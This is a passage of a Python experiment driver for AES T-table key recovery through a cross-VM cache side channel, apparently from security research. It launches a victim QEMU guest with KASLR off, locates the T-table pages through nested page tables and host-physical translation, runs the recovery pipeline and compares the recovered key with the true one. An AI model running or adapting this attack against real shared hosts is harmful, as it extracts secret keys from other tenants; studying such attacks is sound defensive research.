    ap.add_argument("--contention-min-window-us", type=float, default=20.0)
    ap.add_argument("--contention-probe-rounds", type=int, default=2)
    ap.add_argument("--enable-aes-sync", dest="enable_aes_sync", action="store_true")
    ap.add_argument("--disable-aes-sync", dest="enable_aes_sync", action="store_false")
    ap.set_defaults(enable_aes_sync=True)
    ap.add_argument("--aes-sync-phase1-repeats", type=int, default=2)
    ap.add_argument("--phase2-weight", type=float, default=0.25, help="Weight for Phase2 contention signal in fusion")
    ap.add_argument("--phase2-tail-weight", type=float, default=0.5, help="Weight for Phase2 tail hits in fusion")
    ap.add_argument("--min-valid-per-byte", type=int, default=16)
    ap.add_argument("--samples", type=int, default=20000)
    ap.add_argument("--poc-byte-pos", type=int, default=0)
    ap.add_argument("--checkpoints", default="1000,2000,5000,10000,20000,50000,100000")

    # Disaligned attack parameters
    ap.add_argument("--disaligned-attack", action="store_true", help="Enable disaligned T-table attack mode")
    ap.add_argument("--disaligned-samples-per-target", type=int, default=8, help="Samples per target entry in disaligned mode")
    ap.add_argument("--disaligned-target-entries", default="40,41,42,43,44,45,46,47", help="Target entries for disaligned attack")

    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--aes-port", type=int, default=9000)
    ap.add_argument("--aes-sync-port", type=int, default=9002)
    ap.add_argument("--rsa-port", type=int, default=9001)
    ap.add_argument("--sock-timeout-s", type=float, default=3.0)

    ap.add_argument("--qemu-cpu", type=int, default=32)
    ap.add_argument("--cpu-model", default="host,pmu=on")
    ap.add_argument(
        "--guest-extra-cmdline",
        default="nokaslr norandmaps",
        help="Extra kernel cmdline passed to guest via QEMU -append",
    )
    ap.add_argument("--smp", default="1")
    ap.add_argument("--mem", default="4G")
    ap.add_argument("--vm-ready-timeout-s", type=int, default=180)
    ap.add_argument("--random-seed", type=int, default=0)
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    require_root("[!] run_53.py requires root. Use: sudo -E python3 src/scripts/run_53.py ...")

    if args.random_seed != 0:
        random.seed(args.random_seed)

    if int(args.template_pattern_bytes) < LINE_SZ:
        args.template_pattern_bytes = LINE_SZ
    if int(args.template_pattern_bytes) % LINE_SZ != 0:
        args.template_pattern_bytes = (int(args.template_pattern_bytes) // LINE_SZ) * LINE_SZ
        if int(args.template_pattern_bytes) < LINE_SZ:
            args.template_pattern_bytes = LINE_SZ

    outdir = Path(args.outdir).resolve() if args.outdir else timestamped_outdir_ch5("exp5_3")
    outdir.mkdir(parents=True, exist_ok=True)
    print_banner("Experiment 5.3: AES T-Table key recovery", outdir)

    scan_start_gpa, scan_end_gpa, te0_inpage_offset = load_scan_range(args)
    if scan_end_gpa <= scan_start_gpa:
        raise SystemExit(f"[range] invalid range: start=0x{scan_start_gpa:x}, end=0x{scan_end_gpa:x}")
    maybe_sync_oracle_from_range_json(args)

    ensure_artifacts(args.skip_build, outdir / "build_stage")
    collect_host_facts(outdir)

    vm_dir = outdir / "vm_attack"
    proc, npt_sock = launch_victim_vm(args, vm_dir)
    vm_ctl: NptCtlClient | None = None
    try:
        ready = wait_vm_ready(args.host, args.aes_port, args.vm_ready_timeout_s)
        if not ready:
            raise SystemExit(f"[vm] victim services not ready in timeout; see {vm_dir / 'qemu.log'}")
        maybe_override_force_from_boot_oracle(args, vm_dir)
        if not wait_nptctl_ready(npt_sock, args.vm_ready_timeout_s):
            raise SystemExit(f"[vm] nptctl preload not ready in timeout; see {vm_dir / 'qemu.log'}")

        vm_ctl = NptCtlClient(sock_path=npt_sock, timeout_s=args.sock_timeout_s)
        vm_ctl.connect()

        forced = False
        target_page = 0
        te0_gpa = 0
        if str(args.force_te0_gpa).strip():
            te0_gpa = parse_u64(str(args.force_te0_gpa))
            target_page = te0_gpa & ~(PAGE_SZ - 1)
            forced = True
        elif str(args.force_te_page_gpa).strip():
            target_page = parse_u64(str(args.force_te_page_gpa)) & ~(PAGE_SZ - 1)
            te0_gpa = target_page + te0_inpage_offset
            forced = True

        if forced:
            disc_dir = outdir / "discovery"
            disc_dir.mkdir(parents=True, exist_ok=True)
            write_json(
                disc_dir / "selected_target_page.json",
                {
                    "selected_te_page_gpa": f"0x{target_page:x}",
                    "selected_te0_gpa": f"0x{te0_gpa:x}",
                    "te0_inpage_offset": f"0x{te0_inpage_offset:x}",
                    "forced": True,
                    "rows": [
                        {
                            "te_page_gpa": f"0x{target_page:x}",
                            "te0_gpa": f"0x{te0_gpa:x}",
                            "coherence_score": None,
                            "best_line": None,
                            "best_line_delta": None,
                            "npt_score": None,
                            "trigger_hits": None,
                            "baseline_hits": None,
                        }
                    ],
                },
            )
            print(
                "[discover] bypassed by force target: "
                f"te_page_gpa=0x{target_page:x} te0_gpa=0x{te0_gpa:x}"
            )
        else:
            discovery = npt_discovery(vm_ctl, args, scan_start_gpa, scan_end_gpa, outdir)
            if not discovery and args.suspected_range_json:
                fallback_start = 0
                fallback_end = default_scan_end_for_mem(parse_mem_to_bytes(args.mem))
                fallback_end = (fallback_end + (PAGE_SZ - 1)) & ~(PAGE_SZ - 1)
                print(
                    "[discover] empty ranking in suspected range; "
                    f"fallback full-range scan: 0x{fallback_start:x}-0x{fallback_end:x}"
                )
                discovery = npt_discovery(vm_ctl, args, fallback_start, fallback_end, outdir)
                if discovery:
                    scan_start_gpa = fallback_start
                    scan_end_gpa = fallback_end
            if not discovery:
                raise SystemExit("[discover] empty NPT discovery result")

            selected = select_target_page(vm_ctl, discovery, args, outdir, te0_inpage_offset=te0_inpage_offset)
            target_page = int(selected["te_page_gpa"])
            te0_gpa = int(selected["te0_gpa"])
        hpa_info = ioctl_gpa_to_hpa(vm_ctl, te0_gpa)
        te_base_hpa = int(hpa_info["hpa"])
        te_line_base = te_cl_base_gpa(te0_gpa)
        te_lines = te_total_lines(te0_gpa)
        te0_line_start, te0_line_end = table_line_range(te0_gpa, 0)
        meta = {
            "scan_start_gpa": f"0x{scan_start_gpa:x}",
            "scan_end_gpa": f"0x{scan_end_gpa:x}",
            "te_page_gpa": f"0x{target_page:x}",
            "te0_gpa": f"0x{te0_gpa:x}",
            "te0_inpage_offset": f"0x{te0_inpage_offset:x}",
            "te_line_base_gpa": f"0x{te_line_base:x}",
            "te_total_lines": int(te_lines),
            "te0_line_range": [int(te0_line_start), int(te0_line_end)],
            "te_base_hpa": f"0x{te_base_hpa:x}",
            "te_base_hva": f"0x{int(hpa_info['hva']):x}",
            "gpa_to_hpa_ret": int(hpa_info["ret"]),
            "theta_input": int(args.theta),
            "theta_mode": str(args.theta_mode),
            "theta_scale": float(args.theta_scale),
            "score_mode": str(args.score_mode),
            "recover_mode": str(args.recover_mode),
            "template_pattern_bytes": int(args.template_pattern_bytes),
            "correlation_plaintext_mode": str(args.correlation_plaintext_mode),
            "fusion_mode": str(args.fusion_mode),
            "phase2_weight": PHASE2_WEIGHT,
            "phase2_tail_weight": PHASE2_TAIL_WEIGHT,
            "preheat_reads": int(PREHEAT_READS),
            "scan_order": "randomized",
            "center_stat": "median",
            "line_score_model": "snr_separation_confidence_single_table",
            "force_te_page_gpa": str(args.force_te_page_gpa),
            "force_te0_gpa": str(args.force_te0_gpa),
            "target_forced": bool(forced),
            "trigger_repeat_per_sample": int(args.trigger_repeat_per_sample),
            "enable_aes_sync": int(bool(args.enable_aes_sync)),
            "aes_sync_phase1_repeats": int(args.aes_sync_phase1_repeats),
            "observation_kset": str(args.observation_kset),
            "evaluate_ksets": parse_name_list(args.evaluate_ksets),
            "noise_lines": sorted(int(x) for x in (parse_noise_lines(args.noise_lines) or DEFAULT_NOISE_LINES)),
            "min_hit_lines": int(args.min_hit_lines),
            "max_hit_lines": int(args.max_hit_lines),
            "min_valid_per_byte": int(args.min_valid_per_byte),
            "enable_contention": int(bool(args.enable_contention)),
            "theta_contention_input": int(args.theta_contention),
            "theta_contention_tail_input": int(args.theta_contention_tail),
            "contention_calib_trials": int(args.contention_calib_trials),
            "contention_offset_us": float(args.contention_offset_us),
            "contention_sigma_us": float(args.contention_sigma_us),
            "contention_window_sigma": float(args.contention_window_sigma),
            "contention_min_window_us": float(args.contention_min_window_us),
            "contention_probe_rounds": int(args.contention_probe_rounds),
            "guest_cmdline_extra": str(args.guest_extra_cmdline),
        }
        write_json(outdir / "meta_53.json", meta)

        if args.discover_only:
            write_lines(
                outdir / "stats_53.txt",
                [
                    "=== 5.3 discovery only ===",
                    f"scan_start_gpa=0x{scan_start_gpa:x}",
                    f"scan_end_gpa=0x{scan_end_gpa:x}",
                    f"te_page_gpa=0x{target_page:x}",
                    f"te0_gpa=0x{te0_gpa:x}",
                    f"te0_inpage_offset=0x{te0_inpage_offset:x}",
                    f"te_base_hpa=0x{te_base_hpa:x}",
                    "mode=discover_only",
                    "theta=adaptive",
                    f"theta_mode={args.theta_mode}",
                    f"fusion_mode={args.fusion_mode}",
                    f"recover_mode={args.recover_mode}",
                    f"template_pattern_bytes={args.template_pattern_bytes}",
                    f"phase2_weight={PHASE2_WEIGHT}",
                    f"phase2_tail_weight={PHASE2_TAIL_WEIGHT}",
                    f"observation_kset={args.observation_kset}",
                    f"evaluate_ksets={args.evaluate_ksets}",
                    f"noise_lines={args.noise_lines}",
                    f"preheat_reads={PREHEAT_READS}",
                    "scan_order=randomized",
                    "center_stat=median",
                    "line_score_model=snr_separation_confidence_single_table",
                    f"enable_contention={int(bool(args.enable_contention))}",
                    f"enable_aes_sync={int(bool(args.enable_aes_sync))}",
                    "theta_contention=adaptive",
                    "theta_contention_tail=adaptive",
                    f"guest_cmdline_extra={args.guest_extra_cmdline}",
                ],
            )
            print("\n=== 5.3 discovery done ===")
            print(f"data dir: {outdir}")
            return

        line_rows = scan_page_lines(vm_ctl, te0_gpa, args, outdir)
        recovery = recovery_pipeline(vm_ctl, te0_gpa, line_rows, args, outdir)

        obs_stats = recovery["observation_stats"]
        meta["theta_resolved"] = float(obs_stats.get("theta_global_resolved", 0.0))
        meta["theta_contention_resolved"] = int(obs_stats.get("theta_contention", 0))
        meta["theta_contention_tail_resolved"] = int(obs_stats.get("theta_contention_tail", 0))
        meta["contention_threshold_mode"] = str(obs_stats.get("contention_threshold_mode", "manual"))
        write_json(outdir / "meta_53.json", meta)

        write_json(outdir / "metrics_53.json", recovery)
        write_lines(
            outdir / "stats_53.txt",
            [
                "=== 5.3 AES recovery ===",
                f"scan_start_gpa=0x{scan_start_gpa:x}",
                f"scan_end_gpa=0x{scan_end_gpa:x}",
                f"te_page_gpa=0x{target_page:x}",
                f"te0_gpa=0x{te0_gpa:x}",
                f"te0_inpage_offset=0x{te0_inpage_offset:x}",
                f"te_base_hpa=0x{te_base_hpa:x}",
                f"theta_resolved={float(obs_stats['theta_global_resolved']):.3f}",
                f"theta_mode={args.theta_mode}",
                f"theta_scale={args.theta_scale}",
                f"score_mode={args.score_mode}",
                f"recover_mode={args.recover_mode}",
                f"fusion_mode={args.fusion_mode}",
                f"template_pattern_bytes={args.template_pattern_bytes}",
                f"phase2_weight={PHASE2_WEIGHT}",
                f"phase2_tail_weight={PHASE2_TAIL_WEIGHT}",
                f"observation_kset={args.observation_kset}",
                f"evaluate_ksets={args.evaluate_ksets}",
                f"noise_lines={args.noise_lines}",
                f"preheat_reads={PREHEAT_READS}",
                "scan_order=randomized",
                "center_stat=median",
                "line_score_model=snr_separation_confidence_single_table",
                f"trigger_repeat_per_sample={args.trigger_repeat_per_sample}",
                f"enable_contention={int(bool(args.enable_contention))}",
                f"enable_aes_sync={int(bool(args.enable_aes_sync))}",
                f"aes_sync_phase1_repeats={args.aes_sync_phase1_repeats}",
                f"theta_contention={int(obs_stats['theta_contention'])}",
                f"theta_contention_tail={int(obs_stats['theta_contention_tail'])}",
                f"contention_threshold_mode={obs_stats['contention_threshold_mode']}",
                f"guest_cmdline_extra={args.guest_extra_cmdline}",
                f"min_hit_lines={args.min_hit_lines}",
                f"max_hit_lines={args.max_hit_lines}",
                f"min_valid_per_byte={args.min_valid_per_byte}",
                f"samples={args.samples}",
                f"samples_attempted={recovery['observation_stats']['samples_attempted']}",
                f"samples_kept={recovery['observation_stats']['samples_kept']}",
                f"dropped_by_hitcount={recovery['observation_stats']['dropped_by_hitcount']}",
                f"contention_calib_hits={recovery['observation_stats']['contention_calib_hits']}",
                f"contention_calib_trials={recovery['observation_stats']['contention_calib_trials']}",
                f"contention_offset_us={recovery['observation_stats']['contention_offset_us']:.3f}",
                f"contention_sigma_us={recovery['observation_stats']['contention_sigma_us']:.3f}",
                f"contention_window_start_us={recovery['observation_stats']['contention_window_start_us']:.3f}",
                f"contention_window_end_us={recovery['observation_stats']['contention_window_end_us']:.3f}",
                f"phase1_total_hits={recovery['observation_stats']['phase1_total_hits']}",
                f"phase2_total_hits={recovery['observation_stats']['phase2_total_hits']}",
                f"phase2_tail_total_hits={recovery['observation_stats']['phase2_tail_total_hits']}",
                f"poc_byte_pos={recovery['poc_byte_pos']}",
                f"poc_best_key=0x{int(recovery['poc_best_key']):02x}",
                f"poc_correct={int(bool(recovery['poc_correct']))}",
                f"best_k={recovery['best_k']}",
                f"best_recovered_key={recovery['best_result']['recovered_key_hex']}",
                f"true_key={recovery['best_result']['true_key_hex']}",
                f"best_high_nibble_accuracy={float(recovery['best_result']['high_nibble_accuracy']):.6f}",
                f"best_high_nibble_correct={int(recovery['best_result']['high_nibble_correct'])}",
                f"best_byte_accuracy={float(recovery['best_result']['byte_accuracy']):.6f}",
                f"best_full_key_success={int(bool(recovery['best_result']['full_key_success']))}",
            ],
        )

        print("\n=== 5.3 done ===")
        print(f"data dir: {outdir}")
    finally:
        if vm_ctl is not None:
            vm_ctl.close()
        stop_proc(proc, timeout_s=5.0)
        chown_to_sudo_user(outdir)


if __name__ == "__main__":
    main()
